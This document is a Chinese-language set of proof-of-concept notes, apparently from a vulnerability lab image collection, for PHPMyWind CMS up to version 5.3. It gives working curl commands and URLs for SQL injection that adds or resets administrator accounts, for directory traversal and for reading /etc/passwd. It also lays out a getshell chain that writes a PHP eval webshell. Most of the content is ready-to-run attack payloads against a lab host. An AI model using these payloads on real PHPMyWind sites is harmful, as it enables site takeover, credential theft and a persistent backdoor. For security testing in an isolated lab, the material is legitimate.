## PHPMyWind<5.3 sql注入漏洞

测试镜像

* src/phpmywind/5.2

影响版本

* PHPMyWind <= 5.3

参考链接

* [phpmywind最新版sql注入以及后台目录遍历和文件读取](https://www.cnblogs.com/iamstudy/articles/phpmywind_v5-3.html)

Poc

访问页面`http://172.17.0.2/member.php?c=login`

注册任意账号登录前台（测试环境已注册账号test123/123456)

在浏览器控制台获取登录后的cookie，使用如下命令通过SQL注入添加用户名为1231235，密码为admin的管理员账号

```
curl --cookie "PHPSESSID=gvfhv03prfohb53h8755hrl784; username=ee03sU%2FKADizV%2BW%2Fsup0isaaA7h9xwvMcvwVi7wiPSEtVqbq; lastlogintime=861fvAR%2FyPuARgNBA868gqiKim9D%2F%2B9v9t99Jw0oIciGF4VMnLnK; lastloginip=03dewpw0n0mg%2FKsWjryMeVXxcrWCsdVAY6bqdqBkxsT18l1gtI7e" -d "username=123123a123x&password=a123123123&repassword=a123123123&email=a12312@qq.com&sql=insert into pmw_admin (\`username\`,\`password\`,\`levelname\`) values((1231235),0x6333323834643066393436303664653166643261663137326162613135626633,1)" "http://172.17.0.2/member.php?a=perfect"
```



## PHPMyWind<5.3后台目录遍历漏洞

测试镜像

- src/phpmywind/5.2

影响版本

- PHPMyWind <= 5.3

参考链接

- [phpmywind最新版sql注入以及后台目录遍历和文件读取](https://www.cnblogs.com/iamstudy/articles/phpmywind_v5-3.html)

Poc

使用管理员帐户（admin/admin）登录，访问url

`http://172.17.0.2/admin/upload_filemgr_dir.php?dirname=uploads/...././/...././/...././/...././/etc/`

(使用...././/来访问上级目录)



## PHPMyWind<5.3后台任意文件读取漏洞

测试镜像

- src/phpmywind/5.2

影响版本

- PHPMyWind <= 5.3

参考链接

- [phpmywind最新版sql注入以及后台目录遍历和文件读取](https://www.cnblogs.com/iamstudy/articles/phpmywind_v5-3.html)

Poc

使用管理员帐户（admin/admin）登录，访问url

`http://172.17.0.2/admin/editfile_update.php?filename=/../../../../../../etc/passwd`



## PHPMyWind 5.2 getshell

测试镜像

- src/phpmywind/5.2

影响版本

- PHPMyWind <= 5.2

参考链接

- [PHPMyWind 2014-2017 getshell](https://github.com/Mr5m1th/POC-Collect/tree/master/CMS/PHPMyWind/2014-2017)

Poc

通过SQL报错获取表名：

```shell
curl -d "uname=testaa union select 1&answer=2" "http://172.17.0.2/member.php?a=quesfind"
```

会返回SQL报错信息，其中包含数据库表前缀：

```html
<div style="font-family:'微软雅黑';font-size:12px;"><h3 style="margin:0;padding:0;line-height:30px;color:red;">PHPMyWind安全警告：请检查您的SQL语句是否合法，您的操作将被强制停止！</h3><strong>错误文件</strong>：/member.php<br /><strong>错误信息</strong>：SELECT `question`,`answer` FROM `pmw_member` WHERE `username`='testaa union select 1'||SelectBreak</div>
```

重置管理员密码为 admin

```shell
curl "http://172.17.0.2/4g.php?m=show&cid=2&tbname=pmw_admin\`%20SET%20password=0x6333323834643066393436303664653166643261663137326162613135626633%20WHERE%201=1%20or%20@\`%27\`%20--%20@\`%27\`"
```

使用admin/admin登录后台

```
http://172.17.0.2/admin/login.php
```

 数据库管理 -> 执行 SQL语句：

```SQL
insert into `pmw_webconfig`(`varname`, `varvalue`, `vartype`) values('test', 'file_put_contents("demo.php", \'<?php @eval($_POST[x]) ?>\')', 'number');
```

执行完成在后台站点配置管理中，使用任意配置添加一个新站点提交即可获得webshell：

```
http://172.17.0.2/admin/demo.php
```